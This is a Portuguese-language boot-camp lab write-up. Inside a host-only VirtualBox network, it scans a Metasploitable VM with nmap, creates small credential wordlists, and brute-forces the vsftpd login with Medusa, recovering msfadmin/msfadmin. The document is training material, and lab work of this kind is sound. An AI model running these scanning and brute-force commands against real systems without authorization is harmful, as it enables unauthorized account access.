Projeto de testes de vulnerabilidades - Boot Camp Cibersecurity Santader

Prepação e instalação das maquinas Virtuais no Virtual Box.
Host Kali IP 192.168.56.102 - Placa de rede host only.
Host Metaesploitable IP 192.16.56.101  - Placa de rede Host only

Verificar comunicação entre as maquinas 
Comando ping -c 3 192.16.56.101 sem perda de pacotes
Comando ping -c 3 192.16.56.102 sem perda de pacotes

RECONHECIMENTO DAS PORTAS DOS SERVIÇOS RELACIONADOS AO FTP.
2 ~$ nmap -sV -p 21,22,80,445,139 192.168.56.101

RESULTADO
3 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 15:18 -03
4 Nmap scan report for 192.168.56.101
5 Host is up (0.0012s latency).
6
7 PORT STATE SERVICE VERSION
8 21/tcp open ftp vsftpd 2.3.4
9 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
10 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
11 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
12 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
13 MAC Address: 08:00:27:FB:DE:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
14 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
15
16 Service detection performed. Please report any incorrect results at https:// nmap.org/submit/ .
17 Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds

TESTE DE ACESSO AO FTP EXPOSTO

1 └─$ ftp 192.168.56.101
2 Connected to 192.168.56.101.
3 220 (vsFTPd 2.3.4)
4 Name (192.168.56.101:kaliadmin): 

CRIAÇÃO DO ARQUIVO DE SENHAS E PASSWORD

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

REALIZANDO TESTES DE BRUTE FORCE COM O MEDUSA 
$ medusa -H 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
Medusa V2.3 (http://www.foofus.net) (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
R & Remote system type is Unix.
2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 12356 (1 of 4 complete)
2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 12356 (1 of 4 complete)
2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)
2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-11-30 17:17:59 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (2 of 4 complete)
2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
2025-11-30 17:17:59 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 12356 (1 of 4 complete)
2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)
2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-11-30 17:18:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 12356 (1 of 4 complete)
2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (2 of 4 complete)
2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (3 of 4 complete)
2025-11-30 17:18:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)

5 331 Please specify the password.
6 Password:
7 230 Login successful.
8 Remote system type is UNIX.
9 Using binary mode to transfer files.
10 ftp>|

